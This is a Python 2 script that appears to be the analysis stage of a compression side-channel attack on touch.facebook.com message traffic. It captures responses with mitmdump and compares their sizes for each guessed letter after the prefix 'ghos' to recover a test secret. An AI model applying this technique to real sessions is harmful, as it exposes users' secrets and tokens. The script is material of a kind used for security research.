from __future__ import division
from os import system
import datetime

result_file = open("result.log", "w")

start = datetime.datetime.now()
system('mitmdump "touch\.facebook\.com\/messages" > output.log')
finish = datetime.datetime.now()

result_file.write("Secret is 'ghost' and we use reflection 'ghos'\n")
result_file.write("\n")

system("grep '200 OK' output.log > parsed_output.log")

iterations = {}
output_sum = {}
final = {}

for i in xrange(ord("a"), ord("z") + 1):
        iterations[chr(i)] = 0
        output_sum[chr(i)] = 0
        final[chr(i)] = 0

with open("parsed_output.log") as f:
    file_rows = f.readlines()

    for line in file_rows:
            for c in xrange(ord("a"), ord("z") + 1):
                    ch = chr(c)
                    if (line.find("ghos" + ch) > -1):
                            pref, size = line.split("OK ")
                            iterations[ch] = iterations[ch] + 1
                            output_sum[ch] = output_sum[ch] + int(size)
                            """
                            if ((int(size) < 12230) and (int(size) > 12200)):
                                iterations[ch] = iterations[ch] + 1
                                output_sum[ch] = output_sum[ch] + int(size)
                            """

system("rm parsed_output.log")

for c in xrange(ord("a"), ord("z") + 1):
        ch = chr(c)
        if (iterations[ch]):
            final[ch] = output_sum[ch] / iterations[ch]
        result_file.write(ch + " iterations = %d" % iterations[ch] + " output_sum = %d" % output_sum[ch] + " finally = %f\n" % final[ch])

result_file.write("\n")

final_sorted = [ (v,k) for k, v in final.items() ]
final_sorted.sort(reverse=False)
for v,k in final_sorted:
        result_file.write("%s: %f\n" % (k, v))

result_file.write("\n")
result_file.write("Total time: %s\n" % str(finish - start))

result_file.close()

system("cat result.log")